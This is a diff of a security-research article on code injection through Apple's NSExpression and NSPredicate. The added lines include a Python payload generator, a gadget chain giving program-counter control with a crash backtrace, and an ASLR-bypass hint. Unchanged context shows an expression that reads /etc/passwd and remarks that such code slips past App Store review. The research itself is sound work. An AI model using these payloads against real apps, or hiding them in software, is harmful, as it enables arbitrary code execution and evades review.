@@ -66,9 +66,9 @@ It's clearly documented in the [official documentation of NSExpression](https://
 
 > **Function Expressions**
 >
-> In OS X v10.4, NSExpression only supports a predefined set of functions: sum, count, min, max, and average. These predefined functions were accessed in the predicate syntax using custom keywords (for example, MAX(1, 5, 10)).
+> In OS X v10.4, NSExpression only supports a predefined set of functions: sum, count, min, max, and average. These predefined functions were accessed in the predicate syntax using custom keywords (for example, `MAX(1, 5, 10)`).
 >
-> In macOS 10.5 and later, function expressions also support arbitrary method invocations. To use this extended functionality, you can now use the syntax FUNCTION(receiver, selectorName, arguments, ...), for example:
+> In macOS 10.5 and later, function expressions also support arbitrary method invocations. To use this extended functionality, you can now use the syntax `FUNCTION(receiver, selectorName, arguments, ...)`, for example:
 >
 > `FUNCTION(@"/Developer/Tools/otest", @"lastPathComponent") => @"otest"`
 
@@ -84,9 +84,102 @@ For example, this line of code reads out the content of `/etc/passwd`
 FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'), 'initWithContentsOfFile:', '/etc/passwd')
 ```
 
+Here is a python script for converting payloads to expression format:
+
+```python
+def stringify(o):
+    if isinstance(o, str):
+        return '"%s"' % o
+
+    if isinstance(o, list):
+        return '{' + ','.join(map(stringify, o)) + '}'
+
+    return str(o)
+
+
+class Call:
+    def __init__(self, target, sel, *args):
+        self.target = target
+        self.sel = sel
+        self.args = args
+
+    def __str__(self):
+        if len(self.args):
+            joint = ','.join(map(stringify, self.args))
+            tail = ',' + joint
+        else:
+            tail = ''
+        return f'FUNCTION({stringify(self.target)},"{self.sel}"{tail})'
+
+
+class Clazz:
+    def __init__(self, name):
+        self.name = name
+
+    def __str__(self):
+        return f'CAST("{self.name}","Class")'
+```
+
 This is very close to the [SeLector-Oriented Programming by Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1933).
 
-It's just like the `eval()` function of Objective-C.
+It's just like the `eval()` function of Objective-C. PAC doesn't stop this sort of execution at all.
+
+If you prefer classic ROP, here is a method for PC-control, `-[NSInvocation invokeUsingIMP:]`. A problem for this method is that it won't do anything when the `target` property is `nil`. There is no way for both setting initializing the property and then reuse the reference to call its method, because predicates don't support lines and variables (at this moment).
+
+Luckily I found this gadget `-[NSInvocationOperation initWithTarget:selector:object:]` that can initialize the property and return the reference in a chaining call favor.
+
+```c
+NSInvocationOperation *__cdecl -[NSInvocationOperation initWithTarget:selector:object:](NSInvocationOperation *self, SEL a2, id a3, SEL a4, id a5)
+{
+  v19 = a5;
+  v9 = objc_msgSend_0(a3, sel_methodSignatureForSelector_, a4);
+  v10 = v9;
+  v11 = (unsigned __int64)objc_msgSend_0(v9, sel_numberOfArguments);
+  v12 = v11;
+  v13 = +[NSInvocation invocationWithMethodSignature:](
+          &OBJC_CLASS___NSInvocation,
+          sel_invocationWithMethodSignature_,
+          v10);
+  -[NSInvocation setTarget:](v13, sel_setTarget_, a3);
+  -[NSInvocation setSelector:](v13, sel_setSelector_, a4);
+  if ( v12 >= 3 )
+    -[NSInvocation setArgument:atIndex:](v13, sel_setArgument_atIndex_, &v19, 2LL);
+  return (NSInvocationOperation *)-[NSInvocationOperation initWithInvocation:](self, sel_initWithInvocation_, v13);
+}
+```
+
+So the payload for PC-control looks like this:
+
+```python
+def selector(name):
+    expr = Call(Clazz('NSFunctionExpression'), 'alloc')
+    expr = Call(expr, 'initWithTarget:selectorName:arguments:', '', name, [])
+    return Call(expr, 'selector')
+
+def pc_control(pc=0x41414141):
+    NSString = Clazz('NSString')
+    op = Call(Clazz('NSInvocationOperation'), 'alloc')
+    op = Call(op, 'initWithTarget:selector:object:',
+    NSString, selector('alloc'), [])
+    invocation = Call(op, 'invocation')
+    imp = Call(pc, 'intValue')
+    return Call(invocation, 'invokeUsingIMP:', imp) 
+```
+
+```js
+FUNCTION(FUNCTION(FUNCTION(FUNCTION(CAST('NSInvocationOperation','Class'),'alloc'),'initWithTarget:selector:object:',CAST('NSString','Class'),FUNCTION(FUNCTION(FUNCTION(CAST('NSFunctionExpression','Class'),'alloc'),'initWithTarget:selectorName:arguments:','','alloc',{}),'selector'),{}),'invocation'),'invokeUsingIMP:',FUNCTION(0x41414141,'intValue'))
+```
+
+```
+(lldb) bt
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41414141)
+    frame #0: 0x0000000041414141
+    frame #1: 0x00007fff2042556c CoreFoundation`__invoking___ + 140
+    frame #2: 0x00007fff204cff1e CoreFoundation`-[NSInvocation invokeUsingIMP:] + 225
+    frame #3: 0x00007fff211d676b Foundation`-[NSFunctionExpression expressionValueWithObject:context:] + 721
+```
+
+You can defeat ASLR by leveraging `-[CNFileServices dlsym::]` or `-[ABFileServices dlsym::]`. If those classes are not avaliable, use `NSBundle` to load their modules first.
 
 ## Writing An Interpreter
 
@@ -97,11 +190,11 @@ Both NSExpresson and NSPredicate acts as an interpreter that exposes runtime ref
 
 Dynamically loading remote script to execute native methods is considered voilating AppStore review guide.
 
-> This includes any code which passes arbitrary parameters to dynamic methods such as dlopen(), dlsym(), respondsToSelector:, performSelector:, method_exchangeImplementations(), and running remote scripts in order to change app behavior or call SPI, based on the contents of the downloaded script. Even if the remote resource is not intentionally malicious, it could easily be hijacked via a Man In The Middle (MiTM) attack, which can pose a serious security vulnerability to users of your app.
+> This includes any code which passes arbitrary parameters to dynamic methods such as `dlopen()`, `dlsym()`, `respondsToSelector:`, `performSelector:`, `method_exchangeImplementations()`, and running remote scripts in order to change app behavior or call SPI, based on the contents of the downloaded script. Even if the remote resource is not intentionally malicious, it could easily be hijacked via a Man In The Middle (MiTM) attack, which can pose a serious security vulnerability to users of your app.
 
 [Message from Apple Review... - Apple Developer Forums](https://developer.apple.com/forums/thread/73640)
 
-Compared to known dyanmic execution frameworks, `NSExpression` and `NSPredicate` are totally legitimate. You don't have to introduce suspecious symbols like `NSSelectorFromString`. The runtime does the job for you. The code pattern is hard to spot, because it looks like you're just filtering an array with a dynamic predicate. Innocent, isn't it?
+Compared to known dyanmic execution frameworks, `NSExpression` and `NSPredicate` are totally legitimate. You don't have to introduce suspecious symbols like `NSSelectorFromString`, the runtime does the job for you. The code pattern is hard to spot, because it looks like you're just filtering an array with a dynamic predicate. Innocent, isn't it?
 
 Though we've got access to Objective-C runtime, there are some limitations for the expression that makes it hard to program the payload.
 
@@ -165,11 +258,11 @@ $tmp := FUNCTION(FUNCTION(CAST('NSProcessInfo', 'Class'), 'processInfo'), 'envir
 FUNCTION($tmp, 'stringByAppendingString:', $content)
 ```
 
-## Potential Attack Surface
+## Potential Attack Surfaces
 
-We knew that it's better to use parameter binding to avoid SQL injection. For predicates it's just the same. 
+We knew that it's better to use parameter binding to avoid SQL injection. There is parameter binding for predicates, too.
 
-There is a family of them for creating predicate out of a string.
+There is a family of methods for creating predicate out of a string.
 
 * +[NSPredicate predicateWithFormat:]
 * +[NSPredicate predicateWithFormat:argumentArray:]
@@ -178,9 +271,9 @@ There is a family of them for creating predicate out of a string.
 * +[NSExpression expressionWithFormat:argumentArray:]
 * +[NSExpression expressionWithFormat:arguments:]
 
-For those methods that accepts `arguments` or `argumentArray`, they are safe to use because they work just like parameter binding. But if you create a dynamic string from user input and feed it to the format string, it's going to be both format string vulnerability and code injection. At the time of writing this article, Xcode doesn't consider them format string bugs and no warning is generated.
+For those methods that accepts `arguments` or `argumentArray`, they are safe to use because they work just like parameter binding. But if you create a dynamic string from user input and feed it to the format string, it's going to be both a format string vulnerability and a code injection. At the time of writing this article, Xcode doesn't consider them format string bugs and no warning is generated.
 
-So how does Apple prevent the code injection?
+So how does Apple itself prevent the code injection?
 
 ### Serialization
 
@@ -298,8 +391,8 @@ CoreData:__objc_const:00000001BF3962B0	              -[NSSQLPredicateAnalyser vi
 CoreData:__objc_const:00000001BF3993C8	              -[NSSQLSubqueryExpressionIntermediatePredicateVisitor visitPredicateExpression:]
 CoreData:__objc_const:00000001BF3B7568	              -[NSSQLFetchRequestContext visitPredicateExpression:]
 Contacts:__objc_const:00000001BFA4D3D0	              -[CNPredicateValidator visitPredicateExpression:]
-Photos:__objc_const:00000001C025D7D8	              -[PHQuery visitPredicateExpression:]
-AppPredictionClient:__objc_const:00000001C20C5388	  -[ATXActionCriteriaPredicateChecker visitPredicateExpression:]
+Photos:__objc_const:00000001C025D7D8	                -[PHQuery visitPredicateExpression:]
+AppPredictionClient:__objc_const:00000001C20C5388	    -[ATXActionCriteriaPredicateChecker visitPredicateExpression:]
 LoggingSupport:__objc_const:00000001C2B1D760          -[_OSLogPredicateMapper visitPredicateExpression:]
 LoggingSupport:__objc_const:00000001C2B1EE80          -[_OSLogCatalogFilter visitPredicateExpression:]
 LoggingSupport:__objc_const:00000001C2B202E8          -[_OSLogSimplePredicate visitPredicateExpression:]
